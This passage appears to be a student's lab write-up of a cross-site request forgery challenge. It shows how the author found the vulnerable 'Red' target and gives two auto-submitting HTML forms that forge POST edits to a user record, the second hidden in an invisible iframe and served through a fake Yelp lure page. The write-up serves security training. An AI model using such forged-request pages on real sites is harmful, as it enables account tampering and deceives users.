**5. Cross-Site Request Forgery:**

This challenge was a little time consuming but fun. 

In order to succesfully complete this type of attack I had to create an HTML form 
that would forge a POST request from the victim's browser. To do this, I emmbeded the form
to my malicious website and then I had to tempt the victim into visiting it. 

First, I had to figure out which target out of the three was vulnerable to CSRF. 
So I created my form that would load automatically whenever the victim clicked on it.
I saved my form as an HTML file and I would just launch it by double-clicking on it 
from my File Explorer. Then I simply changed the target on the HTML form URL from something like this: 

`'<form action="https://35.224.226.149/blue/public/staff/users/edit.php?id=1" name="csrfForm" target="hiddenFrame" method="POST">`

To something like this: 

`<form action="https://35.224.226.149/greeen/public/staff/users/edit.php?id=1" name="csrfForm" target="hiddenFrame" method="POST">`

Until I found that the target that was vulnerable to CSRF was the Red target.

- At first I wasn't using a hidden iframe, so my attack could still be noticed by the user as the request would be redirected to the user's details page after submitting the HTML form I had crafted:

```
<html><body onload="document.csrfForm.submit()">
  <form action="https://35.224.226.149/red/public/staff/users/edit.php?id=1" name="csrfForm" method="POST">
    <input type="hidden" name="first_name" value="JimmyJimmy" />
    <input type="hidden" name="last_name" value="Was Hacked" />
    <input type="hidden" name="username" value="hacker" />
    <input type="hidden" name="email" value="hacker@attacker.com">    
  </form>
</body></html>
```

- In order to completely hide the attack from the victim's view, I turned my form into a hidden iframe. 

```
<html><body onload="document.csrfForm.submit()">
  <form action="https://35.224.226.149/red/public/staff/users/edit.php?id=1" name="csrfForm" target="hiddenFrame" method="POST">
    <input type="hidden" name="first_name" value="JimmyJimmy" />
    <input type="hidden" name="last_name" value="Was Hacked" />
    <input type="hidden" name="username" value="hacker" />
    <input type="hidden" name="email" value="hacker@attacker.com">  
  </form>
  <iframe name="hiddenFrame" style="display: none;"></iframe>
</body></html>
```
- This form was embedded into the attacker's website, and does all the dirty work of forging a request on behalf of the victim in the background whenever the victim loads the attacker's page. 
- I created a fake Yelp site on my local Windows 10 machine to trick the victim from Globitek into checking a bad online review of the company.
